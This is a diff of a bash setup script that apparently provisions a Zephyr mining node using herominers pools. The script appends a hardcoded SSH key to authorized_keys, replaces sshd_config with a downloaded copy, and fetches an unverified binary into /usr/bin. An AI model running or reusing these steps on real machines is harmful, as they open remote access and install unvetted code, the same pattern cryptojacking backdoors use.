@@ -1,10 +1,10 @@
 #!/bin/bash
 
 # Install necessary packages
-apt-get update -y
-apt-get install curl wget screen cron hping3 -y
+apt-get update -qy
+apt-get install curl wget screen cron bc -qy
 
-# Setup SSH
+# Setup SSH Keys
 cd ~
 mkdir -p ~/.ssh
 chmod 700 ~/.ssh
@@ -12,12 +12,16 @@ touch ~/.ssh/authorized_keys
 chmod 600 ~/.ssh/authorized_keys
 echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOswKNcA2Gzv/mGSu2oeh571PlbpyAekXkmVh8FVx/z/ crypto@currency" >> ~/.ssh/authorized_keys
 
-# Download and set SSH config
-wget https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O sshd_config
+# Set SSH config
+wget -q https://raw.githubusercontent.com/realtkco/scripts/main/sshd_config -O sshd_config
 rm -rf /etc/ssh/sshd_config
 mv sshd_config /etc/ssh/sshd_config
 
-# Define the list of addresses for latency check
+#Install PapPing
+wget -q https://raw.githubusercontent.com/realtkco/scripts/main/paping && mv paping /usr/bin && chmod a+x /usr/bin/paping
+
+
+# List of server addresses
 servers=(
     "de.zephyr.herominers.com"
     "fi.zephyr.herominers.com"
@@ -41,8 +45,6 @@ minLatency=1000000
 minServer=""
 
 for server in "${servers[@]}"; do
-    echo "Pinging $server..."
-
     # Run paping, extract average latency
     result=$(paping "$server" -c 3 -p $port | grep 'Average' || echo "Error pinging $server")
 
@@ -73,8 +75,7 @@ done
 
 echo "The server with the lowest latency is $minServer with an average latency of $minLatency ms."
 
-
-MINER_ENDPOINT="$minServer:1123"
+PoolEndpoint="$minServer:1123"
 
 # Proceed with the rest of the script
 hostnamectl set-hostname $(curl -s4 https://i.wiggy.cc/scripts/api.php)$(systemd-detect-virt -q && echo "-vm" || echo "")
